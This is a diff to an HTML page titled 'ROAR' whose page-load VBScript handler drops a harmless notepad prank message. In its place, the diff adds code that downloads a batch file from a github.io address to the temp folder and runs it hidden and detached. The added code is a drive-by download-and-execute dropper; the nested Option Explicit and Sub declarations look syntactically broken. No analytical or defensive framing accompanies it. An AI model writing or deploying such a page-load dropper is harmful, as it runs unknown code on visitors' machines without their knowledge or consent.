@@ -3,8 +3,41 @@
     <title>ROAR</title>
     <script language="VBScript">
       Sub Window_OnLoad()
-        CreateObject("WScript.Shell").Run "notepad.exe"
-	MsgBox "RAAAAR YOUR COMPUTER WOULD HAVE BEEN HACKED! FOOLED?"
+        Option Explicit
+
+Dim url, batchPath, fso, wsh
+
+url = "https://terencep1.github.io/diiiiiiiie.bat"
+batchPath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\diiiiiiiie.bat"
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set wsh = CreateObject("WScript.Shell")
+
+' --- Subroutines ---
+
+Sub DownloadFile(fileURL, savePath)
+    Dim xmlHttp, adoStream
+    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
+    xmlHttp.Open "GET", fileURL, False
+    xmlHttp.Send
+    If xmlHttp.Status = 200 Then
+        Set adoStream = CreateObject("ADODB.Stream")
+        adoStream.Type = 1 ' Binary
+        adoStream.Open
+        adoStream.Write xmlHttp.ResponseBody
+        adoStream.SaveToFile savePath, 2 ' Overwrite if exists
+        adoStream.Close
+    Else
+        WScript.Echo "Download failed: HTTP " & xmlHttp.Status
+        WScript.Quit
+    End If
+End Sub
+' Download batch file
+DownloadFile url, batchPath
+
+' Run batch file hidden and detached
+wsh.Run batchPath,0,False
+
       End Sub
     </script>
   </head>
